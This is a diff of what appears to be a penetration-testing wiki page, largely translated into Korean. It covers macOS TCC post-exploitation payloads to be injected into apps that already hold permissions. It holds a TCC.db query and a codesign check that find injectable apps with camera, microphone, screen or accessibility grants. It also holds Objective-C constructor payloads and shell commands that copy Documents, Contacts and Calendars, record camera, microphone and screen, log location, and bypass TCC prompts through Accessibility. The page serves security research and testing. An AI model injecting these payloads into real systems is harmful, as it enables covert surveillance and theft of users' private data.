@@ -3,14 +3,26 @@
 {{#include ../../../../banners/hacktricks-training.md}}
 
 > [!TIP]
-> TCC decisions are tied to the **identity of the process** requesting the resource. In post-exploitation, the usual goal is to **inject these payloads into an already-approved app** (or otherwise execute them in its bundle / signature context) instead of running a fresh helper that will trigger its own prompt.
+> TCC 결정은 리소스를 요청하는 **process의 identity**에 연결됩니다. post-exploitation에서 일반적인 목표는 자체 prompt를 발생시키는 새로운 helper를 실행하는 대신, 이러한 payload를 이미 승인된 app에 **inject**하거나 해당 app의 bundle / signature context에서 실행하는 것입니다.
 >
-> For **Screen Recording**, **Input Monitoring**, and **synthetic input**, modern macOS also exposes explicit preflight / request APIs such as `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess`, and `CGRequestPostEventAccess`.
+> **Screen Recording**, **Input Monitoring**, **synthetic input**의 경우 최신 macOS는 `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess`, `CGRequestPostEventAccess`와 같은 명시적인 preflight / request API도 제공합니다.
 
 > [!WARNING]
-> This is still a very realistic attack path: recent permission-theft research against Microsoft macOS apps showed that **weak library validation / plugin loading** can let an attacker reuse the victim app's already-granted **camera**, **microphone**, and other TCC permissions without a second prompt.
+> 이는 여전히 매우 현실적인 attack path입니다. Microsoft macOS app을 대상으로 한 최근 permission-theft research에 따르면 **weak library validation / plugin loading**을 통해 attacker가 피해자 app에 이미 부여된 **camera**, **microphone** 및 기타 TCC permission을 두 번째 prompt 없이 재사용할 수 있습니다.
 
-### Desktop
+## payload를 사용하기 전 빠른 triage
+
+최근 permission-theft research는 동일한 workflow를 계속 강조합니다. 먼저 원하는 TCC grant를 이미 보유한 app을 찾은 다음, 해당 app이 현실적인 injection target인지 확인해야 합니다.
+```bash
+sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
+"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
+
+codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
+egrep 'disable-library-validation|allow-dyld-environment-variables'
+```
+대상이 attacker-controlled plug-ins / frameworks도 로드한다면, 이러한 payloads는 훨씬 더 흥미로워집니다. 이미 승인된 process 내부에 진입한 후의 보다 폭넓은 post-exploitation 아이디어는 [this related page](macos-tcc-credential-and-data-theft.md)를 확인하세요.
+
+### 데스크톱
 
 - **Entitlement**: None
 - **TCC**: kTCCServiceSystemPolicyDesktopFolder
@@ -59,14 +71,14 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {{#endtab}}
 {{#endtabs}}
 
-### Documents
+### 문서
 
-- **Entitlement**: None
+- **Entitlement**: 없음
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Documents`을 `/tmp/documents`로 복사합니다.
+`$HOME/Documents`를 `/tmp/documents`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -101,7 +113,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/`Documents를 `/tmp/documents`로 복사하세요.
+`$HOME/`Documents를 `/tmp/documents`로 복사합니다.
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -213,7 +225,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-`$HOME/Library/Application Support/AddressBook`를 `/tmp/contacts`로 복사합니다.
+`$HOME/Library/Application Support/AddressBook`을 `/tmp/contacts`로 복사합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -297,21 +309,21 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-`$HOME/Library/Calendars`를 `/tmp/calendars`로 복사하세요.
+`$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Camera
+### 카메라
 
 - **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-3초짜리 비디오를 녹화하여 **`/tmp/recording.mov`**에 저장하세요
+3초 분량의 동영상을 녹화하여 **`/tmp/recording.mov`**에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -422,22 +434,41 @@ fclose(stderr); // Close the file stream
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+현재 프로세스가 아직 `NotDetermined` 상태인 경우 카메라 프롬프트를 트리거합니다.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void camprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
+NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-카메라로 사진 찍기
+카메라로 사진을 촬영합니다.
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### 마이크
+### Microphone
 
 - **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
 {{#tab name="ObjetiveC - Record"}}
-5초 동안 오디오를 녹음해 `/tmp/recording.m4a`에 저장합니다
+5초 동안 오디오를 녹음하고 `/tmp/recording.m4a`에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -537,7 +568,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-앱이 마이크에 접근할 수 있는지 확인합니다.
+앱이 마이크에 액세스할 수 있는지 확인합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -567,8 +598,27 @@ static void telegram(int argc, const char **argv) {
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Prompt"}}
+현재 프로세스가 여전히 `NotDetermined`인 경우 microphone prompt를 트리거합니다.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <AVFoundation/AVFoundation.h>
+#import <dispatch/dispatch.h>
+__attribute__((constructor))
+static void micprompt(int argc, const char **argv) {
+if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
+dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
+NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
+dispatch_semaphore_signal(sem);
+}];
+dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-5초 동안 오디오를 녹음하고 `/tmp/recording.wav`에 저장합니다
+5초간 오디오를 녹음하여 `/tmp/recording.wav`에 저장합니다.
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -578,17 +628,17 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {{#endtab}}
 {{#endtabs}}
 
-### Location
+### 위치
 
 > [!TIP]
-> 앱이 위치를 가져오려면 **Location Services**(Privacy & Security에서)가 **활성화되어 있어야 합니다.** 그렇지 않으면 접근할 수 없습니다.
+> 앱이 위치 정보를 가져오려면 **위치 서비스**(개인정보 보호 및 보안)가 **활성화되어 있어야 하며,** 그렇지 않으면 해당 정보에 액세스할 수 없습니다.
 
 - **Entitlement**: `com.apple.security.personal-information.location`
-- **TCC**: `/var/db/locationd/clients.plist`에서 Granted됨
+- **TCC**: `/var/db/locationd/clients.plist`에서 부여됨
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-위치를 `/tmp/logs.txt`에 작성
+위치를 `/tmp/logs.txt`에 기록합니다.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -638,7 +688,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-셸에서 현재 위치를 가져옵니다.
+shell에서 현재 위치를 가져옵니다.
 ```bash
 # Fast option: use a dedicated CoreLocation CLI helper
 brew install --cask corelocationcli
@@ -648,19 +698,19 @@ CoreLocationCLI --json
 CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
 > [!TIP]
-> 이 내용은 여전히 **Location Services**가 활성화되어 있어야 하고, 도구 / 터미널이 TCC 승인을 받아야 합니다. `CoreLocationCLI`는 대부분의 Mac에서 Wi-Fi 보조 위치 결정에도 의존하므로, Wi-Fi를 비활성화하면 종종 `kCLErrorDomain error 0`으로 끝납니다.
+> 이는 여전히 **Location Services**가 활성화되어 있고 tool / terminal이 TCC 승인을 받아야 합니다. `CoreLocationCLI`는 대부분의 Mac에서 Wi-Fi-assisted positioning에도 의존하므로, Wi-Fi가 비활성화되어 있으면 `kCLErrorDomain error 0`으로 끝나는 경우가 많습니다.
 
 {{#endtab}}
 {{#endtabs}}
 
-### Screen Recording
+### 화면 녹화
 
-- **Entitlement**: None
+- **Entitlement**: 없음
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-메인 화면을 `/tmp/screen.mov`에 5초 동안 녹화합니다
+`/tmp/screen.mov`에 5초 동안 메인 화면을 녹화합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -718,7 +768,7 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check / Prompt"}}
-현재 프로세스가 화면을 캡처할 수 있는지 확인하고, 필요하면 TCC 프롬프트를 트리거합니다.
+현재 프로세스가 화면을 캡처할 수 있는지 확인하고 필요한 경우 TCC prompt를 트리거합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <CoreGraphics/CoreGraphics.h>
@@ -739,7 +789,7 @@ fclose(stderr);
 {{#endtab}}
 
 {{#tab name="Shell"}}
-메인 화면을 5초 동안 녹화합니다
+5초 동안 주 화면을 녹화합니다.
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
@@ -747,14 +797,14 @@ screencapture -V 5 /tmp/screen.mov
 {{#endtabs}}
 
 > [!TIP]
-> **macOS 12.3+**에서는 `ScreenCaptureKit`가 보통 `AVCaptureScreenInput`보다 더 나은 post-exploitation primitive입니다: 고성능 스트리밍, `SCScreenshotManager`를 사용한 단일 프레임 캡처, 그리고 **system audio** 스트리밍이 가능합니다. **microphone** 오디오도 원한다면 여전히 `kTCCServiceMicrophone`이 필요합니다. 더 많은 desktop-session abuse primitives는 [이 관련 페이지](../macos-input-monitoring-screen-capture-accessibility.md)를 보세요.
+> **macOS 12.3+**에서는 `AVCaptureScreenInput`보다 `ScreenCaptureKit`이 일반적으로 더 나은 post-exploitation primitive입니다. 고성능 streaming, `SCScreenshotManager`를 사용한 single-frame grabs, **system audio** streaming이 가능하기 때문입니다. 최근 `ScreenCaptureKit` 업데이트에는 `SCStreamConfiguration`의 `captureMicrophone` / `microphoneCaptureDeviceID`와 파일에 직접 기록하는 `SCRecordingOutput`도 추가되었습니다. 따라서 hijacked screen-capture client 하나로 screen + system audio를 직접 저장하고, 해당 process가 `kTCCServiceMicrophone`도 보유한 경우 mic audio를 추가할 수 있습니다. 더 많은 desktop-session abuse primitive는 [이 관련 페이지](../macos-input-monitoring-screen-capture-accessibility.md)를 참조하세요.
 
 ### Accessibility
 
-- **Entitlement**: None
+- **Entitlement**: 없음
 - **TCC**: `kTCCServiceAccessibility`
 
-TCC privilege를 사용해 Finder의 control을 수락하고 enter를 눌러 그 방식으로 TCC를 우회한다
+TCC privilege를 사용하여 Finder가 enter 키를 누르는 동작을 제어하도록 승인하고, 이를 통해 TCC를 우회합니다.
 
 {{#tabs}}
 {{#tab name="Accept TCC"}}
@@ -806,6 +856,20 @@ usleep(100000); // 0.1 seconds
 }
 }
 return 0;
+}
+```
+{{#endtab}}
+
+{{#tab name="Check / Prompt"}}
+현재 프로세스가 Accessibility에 대해 이미 신뢰된 상태인지 확인하고, 그렇지 않다면 macOS에 동의 UI를 표시하도록 요청합니다.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <ApplicationServices/ApplicationServices.h>
+__attribute__((constructor))
+static void axprompt(int argc, const char **argv) {
+NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
+BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
+NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
 }
 ```
 {{#endtab}}
@@ -918,17 +982,19 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Accessibility는 매우 강력한 권한**이며, 다른 방식으로도 악용할 수 있습니다. 예를 들어 System Events를 호출할 필요 없이 이 권한만으로 **keystrokes attack**을 수행할 수 있습니다.
+> [!CAUTION] > **Accessibility는 매우 강력한 권한**이므로, 다른 방식으로도 악용할 수 있습니다. 예를 들어 System Events를 호출하지 않고도 **keystrokes attack**을 수행할 수 있습니다.
 
 > [!TIP]
-> 최신 macOS 버전은 **Input Monitoring** (`kTCCServiceListenEvent`)과 **synthetic input** (`kTCCServicePostEvent`)으로 데스크톱 세션 악용을 분리하기도 합니다. AXUIElement automation 대신 keylogging, screen grabs, 또는 raw event injection이 필요하다면 [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md)를 확인하세요.
+> 최신 macOS 버전에서는 desktop-session abuse를 **Input Monitoring**(`kTCCServiceListenEvent`)과 **synthetic input**(`kTCCServicePostEvent`)으로도 분리합니다. AXUIElement automation 대신 keylogging, screen grabs 또는 raw event injection이 필요한 경우 [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md)를 확인하세요.
 
 
 
 ## References
 
-- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [Cisco Talos - macOS용 Microsoft 앱의 여러 취약점이 permission 탈취의 길을 여는 방법](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
 - [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+- [Apple Developer - macOS에서 Media Capture 권한 요청](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
+- [Apple Developer - ScreenCaptureKit으로 HDR 콘텐츠 캡처하기 (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
 
 
 {{#include ../../../../banners/hacktricks-training.md}}
